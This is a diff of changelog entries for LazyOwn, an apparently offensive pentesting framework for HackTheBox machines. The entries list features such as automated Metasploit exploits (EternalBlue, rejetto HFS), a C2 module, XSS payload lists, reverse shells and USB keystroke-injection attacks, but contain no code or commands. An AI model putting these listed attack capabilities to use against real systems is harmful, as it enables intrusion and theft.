+  *   * release(tes): tes \n\n Version: vvvrelease/0.0.0 \n\n tes \n\n Modified file(s):\n- CHANGELOG.md - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:23:17 2024 -0300 \n\n Hora: 1729560197
+
+
+### Nuevo Release
+
+### Otros
+
+  *   * release(test): test \n\n Version: vvvrelease/0.0.0 \n\n test \n\n Modified file(s):\n- CHANGELOG.md - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:12:57 2024 -0300 \n\n Hora: 1729559577
+
+
+### Nuevo Release
+
+### Otros
+
+  *   * release(release): test \n\n Version: vvrelease/0.0.0 \n\n test \n\n   LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 22:01:58 2024 -0300 \n\n Hora: 1729558918
+
+
+### Otros
+
+### Otros
+
+  *   * release: test\n\nVersion: vrelease/0.0.0\n\ntest\n\nModified file(s):\n- CHANGELOG.md - DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak - version.json\nLazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429\nLazyOwn: https://grisuno.github.io/LazyOwn/\n\n\nFecha: lun 21 oct 2024 22:01:58 -03\n
+
+
+### Nuevo Release
+
+### Otros
+
+  *   * release(test): test \n\n Version: release/0.0.0 \n\n test \n\n Modified file(s):\n- CHANGELOG.md - DEPLOY.sh - README.md - docs/CHANGELOG.html - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:57:05 2024 -0300 \n\n Hora: 1729558625
+
+
+### Nuevo Release
+
+### Otros
+
+  *   * release(test): test \n\n Version: release/0.0.0 \n\n release \n\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:50:52 2024 -0300 \n\n Hora: 1729558252
+
+
+### Nuevo Release
+
+### Otros
+
+  *   * release(test): test \n\n Version: release/0.0.0 \n\n test \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:45:43 2024 -0300 \n\n Hora: 1729557943
+
+
+### Nuevo parche
+
+### Otros
+
+  *   * patch(test): test \n\n Version: release/0.1.0 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:44:32 2024 -0300 \n\n Hora: 1729557872
+
+
+### Nuevo Release
+
+### Otros
+
+  *   * release(release): test \n\n Version: release/0.0.0 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:44:02 2024 -0300 \n\n Hora: 1729557842
+
+
+### Nuevo parche
+
+### Otros
+
+  *   * patch(test): test \n\n Version: release/0.1.0 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:43:41 2024 -0300 \n\n Hora: 1729557821
+
+
+### Nuevo parche
+
+### Otros
+
+  *   * patch(test): test \n\n Version: release/0.1.0 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:43:22 2024 -0300 \n\n Hora: 1729557802
+
+
+### Nuevo Release
+
+### Otros
+
+  *   * release(release): test \n\n Version: release/0.0.0 \n\n test \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:41:14 2024 -0300 \n\n Hora: 1729557674
+
+
+### Nuevo Release
+
+### Otros
+
+  *   * release(release): release \n\n Version: release/0.0.0 \n\n release \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:40:50 2024 -0300 \n\n Hora: 1729557650
+
+
+### Nuevo Release
+
+### Otros
+
+  *   * release(release test): test \n\n Version: release/0.0.0 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:39:11 2024 -0300 \n\n Hora: 1729557551
+
+
+### Nuevo parche
+
+### Otros
+
+  *   * patch(patch): creating new tag \n\n Version: release/0.1.0 \n\n and new release \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:38:41 2024 -0300 \n\n Hora: 1729557521
+
+
+### Nuevo parche
+
+### Otros
+
+  *   * patch(patch): new library \n\n Version: release/0.1.0 \n\n cmd2 \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:37:55 2024 -0300 \n\n Hora: 1729557475
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(new version): new release \n\n Version: release/0.0.1 \n\n now on cmd2 \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 21:35:57 2024 -0300 \n\n Hora: 1729557357
+
+
+### Nuevo Release
+
+### Otros
+
+  *   * release(release): migration from cmd to cmd2 \n\n Version: release/0.0.0 \n\n Not fully tested yet but... here go... \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - modules/duckdns.sh - modules/lazyrtpflood.sh - modules/lazywps.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 21 20:31:30 2024 -0300 \n\n Hora: 1729553490
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): test \n\n Version: release/0.1.66 \n\n test \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - payload.json - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Oct 20 21:05:18 2024 -0300 \n\n Hora: 1729469118
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): openredirex, feroxbuster, gowitness, odat \n\n Version: release/0.1.66 \n\n all documented at COMMANDS.md and new channel https://odysee.com/@KillerMonkyRecordz:d \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - payload.json - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Oct 20 00:47:36 2024 -0300 \n\n Hora: 1729396056
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): test \n\n Version: release/0.1.65 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload1.json\nDeleted file(s):\n- payload1.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 19 18:24:04 2024 -0300 \n\n Hora: 1729373044
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): monteverde machine \n\n Version: release/0.1.65 \n\n ad_getpass, some refactors. \n\n Modified file(s):\n- COMMANDS.md - Invoke-PowerShellTcp.ps1 - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - modules/credentials.json - payload.json - sessions/download_resources.sh\nDeleted file(s):\n- Invoke-PowerShellTcp.ps1\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 19 01:10:29 2024 -0300 \n\n Hora: 1729311029
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): test \n\n Version: release/0.1.64 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - sessions/users.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 19 00:18:05 2024 -0300 \n\n Hora: 1729307885
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): test \n\n Version: release/0.1.64 \n\n test \n\n Modified file(s):\n- .gitignore - COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - firefox.dmp - lazyown - utils.py\nDeleted file(s):\n- firefox.dmp\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Oct 18 01:37:16 2024 -0300 \n\n Hora: 1729226236
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): test \n\n Version: release/0.1.64 \n\n image banner responsive \n\n Modified file(s):\n- README.md - banner.py - docs/README.html - docs/index.html - docs/index.html.bak - firefox.dmp\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Oct 18 01:30:10 2024 -0300 \n\n Hora: 1729225810
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): test \n\n Version: release/0.1.64 \n\n test \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Oct 17 23:48:09 2024 -0300 \n\n Hora: 1729219689
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): new commands documented at COMMANDS.md \n\n Version: release/0.1.64 \n\n xsstrike, breacher, parth, blazy, loxs, crack_cisco_7_password,  and new banner in colors ;) and options --old-banner to see the old banner \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - payload.json - sessions/download_resources.sh - sessions/users.txt - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 15 23:55:33 2024 -0300 \n\n Hora: 1729047333
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): test \n\n Version: release/0.1.63 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 15 21:48:53 2024 -0300 \n\n Hora: 1729039733
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): no test \n\n Version: release/0.1.63 \n\n testing \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - sessions/users.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 15 21:39:48 2024 -0300 \n\n Hora: 1729039188
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): test \n\n Version: release/0.1.63 \n\n test \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json - sessions/download_resources.sh - sessions/users.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 15 02:57:20 2024 -0300 \n\n Hora: 1728971840
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): deply \n\n Version: release/0.1.63 \n\n new \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 15 02:52:56 2024 -0300 \n\n Hora: 1728971576
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): deploy \n\n Version: release/0.1.63 \n\n  \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json - sessions/users.txt - sessions/win/LazyOwnEvilWMI.ps1 - sessions/win/lazycat.ps1\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 14 07:50:57 2024 -0300 \n\n Hora: 1728903057
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(refactor): hashs \n\n Version: release/0.1.63 \n\n new logic of get hash similar to credentials \n\n Modified file(s):\n- README.md - UTILS.md - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Oct 14 04:27:17 2024 -0300 \n\n Hora: 1728890837
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): new commands documented at COMMANDS.md \n\n Version: release/0.1.63 \n\n ip2hex, keepass, john2keepass \n\n Modified file(s):\n- .gitignore - COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - install.sh - lazyown - payload.json - sessions/win/LazyOwnEvilWMI.ps1 - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Oct 13 01:52:12 2024 -0300 \n\n Hora: 1728795132
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): new commands like emp3r0r, template_helper_serializer, gospherus, wpscan, createjsonmachine_batch this is so important, is for monetize your skills with hackerone.com \n\n Version: release/0.1.62 \n\n all commands documented at COMMANDS.md, to use createjsonmachine_batch you need download csv from hackerone of the opportunnity campaign, in scope click in Download CSV, you download in sessions directory of lazyown and the command createjsonmachine_batch will do the magic! \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - payload.json - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 12 04:07:36 2024 -0300 \n\n Hora: 1728716856
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(refactor): refactor of users.txt \n\n Version: release/0.1.61 \n\n now you can choice the users dic do you watn to use, and refactor whole users.txt hardcoded, celebrate with the add of username_anarchy t00l c0mmand add to COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 12 02:17:48 2024 -0300 \n\n Hora: 1728710268
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(refactor): refactor lazy_ruberdigispark isnto duckyspark \n\n Version: release/0.1.61 \n\n command documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - modules/digispark.ino - payload.json - sessions/download_resources.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Oct 11 03:20:10 2024 -0300 \n\n Hora: 1728627610
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(docs): trasnlated nmap script \n\n Version: release/0.1.61 \n\n and add new feature vuln searchs \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Oct 11 03:19:10 2024 -0300 \n\n Hora: 1728627550
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(refactor): nmap \n\n Version: release/0.1.61 \n\n nmap script was refactored, translated, and new feature, vulnerability search with nmap \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - modules/lazynmap.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Oct 11 00:52:41 2024 -0300 \n\n Hora: 1728618761
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): New Feature Automate Arduino Attacks or AAA the command is lazy_ducky_digispark \n\n Version: release/0.1.61 \n\n documented at COMMANDS.md and README.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Thu Oct 10 18:41:59 2024 -0300 \n\n Hora: 1728596519
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): finger_user_enum \n\n Version: release/0.1.60 \n\n new functionality documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - modules/credentials.json - payload.json - payload_poison.htb.json\nDeleted file(s):\n- payload_poison.htb.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Oct 9 20:51:25 2024 -0300 \n\n Hora: 1728517885
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): trasnform \n\n Version: release/0.1.59 \n\n command documented at COMMANDS.md like transform \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Oct 9 02:40:41 2024 -0300 \n\n Hora: 1728452441
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix): bug fixing \n\n Version: release/0.1.58 \n\n int the dunction do_ssh credentials are capture exception \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 8 18:37:32 2024 -0300 \n\n Hora: 1728423452
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix): tags \n\n Version: release/0.1.57 \n\n xd \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 8 18:36:20 2024 -0300 \n\n Hora: 1728423380
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(refactor): refactor de find y nc \n\n Version: release/0.1.56 \n\n nuevos payloads en fidn y el comando nc ahora aguanta el parametro file que permite escuchar por archivos no solo por terminales \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 8 02:16:54 2024 -0300 \n\n Hora: 1728364614
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feature & refactor): new commands and refactor \n\n Version: release/0.1.56 \n\n new commands documented at COMMANDS.md : createjsonmachine, xss, arjun,  and refactor of lazylogpoisoning and C2 PORT FORWARDING ;) to pivoting \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - modules/XssPayloads.txt - modules/admin_panels.txt - modules/lazyc2.py - modules/lazylogpoisoning.py - modules/templates/index.html - payload.json - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Oct 6 21:49:45 2024 -0300 \n\n Hora: 1728262185
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): automsf \n\n Version: release/0.1.55 \n\n new command documented at COMMAND.md AUTOMSF using a payload run an automated attack \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Oct 6 03:25:28 2024 -0300 \n\n Hora: 1728195928
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(new machine return): is a nice machine :P \n\n Version: release/0.1.54 \n\n to go sleep nice :P \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sun Oct 6 02:19:22 2024 -0300 \n\n Hora: 1728191962
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): new machine yummy.htb found a command in find to reverse shell :P \n\n Version: release/0.1.54 \n\n please subs! https://www.youtube.com/@KillerMonkyRecordz \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - modules/lazylynis.sh - payload.json - sessions/users.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 5 13:02:03 2024 -0300 \n\n Hora: 1728144123
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new attack mfscosole automated \n\n Version: release/0.1.54 \n\n httpFileServer version 2.3 CVE-2014-6287 exploit/windows/http/rejetto_hfs_exec command with the same name rejetto_hfs_exec documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 5 01:44:12 2024 -0300 \n\n Hora: 1728103452
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): testing DEPLOY.sh script \n\n Version: release/0.1.53 \n\n to youtube :D https://www.youtube.com/@KillerMonkyRecordz please subs!! \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 5 01:41:25 2024 -0300 \n\n Hora: 1728103285
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(docs): nueva documentacion comando evidence \n\n Version: release/0.1.53 \n\n ahroa en ingles y mas detallado \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Oct 5 01:18:45 2024 -0300 \n\n Hora: 1728101925
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): lazyown infinite glitch storage \n\n Version: release/0.1.53 \n\n works like a charm :D \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - payload.json - sessions/users.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Oct 4 01:33:06 2024 -0300 \n\n Hora: 1728016386
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix): fix in find command \n\n Version: release/0.1.53 \n\n command find documented at commands.md \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Oct 4 00:28:05 2024 -0300 \n\n Hora: 1728012485
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(refactor): refactor de credentials de evilwinrm de psexec, find \n\n Version: release/0.1.52 \n\n new commands cve documented COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - payload.json - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Oct 2 00:57:56 2024 -0300 \n\n Hora: 1727841476
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): eternalblue \n\n Version: release/0.1.52 \n\n and scanner in pwntomate tool alias pyautomate coomand \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 1 01:42:32 2024 -0300 \n\n Hora: 1727757752
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(test): deleting users from ctf game from repo \n\n Version: release/0.1.51 \n\n https://www.youtube.com/watch?v=H9pRwgNw9Ps \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - sessions/users.txt\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Oct 1 00:06:24 2024 -0300 \n\n Hora: 1727751984
+
+
+### Otros
+
+### Otros
+
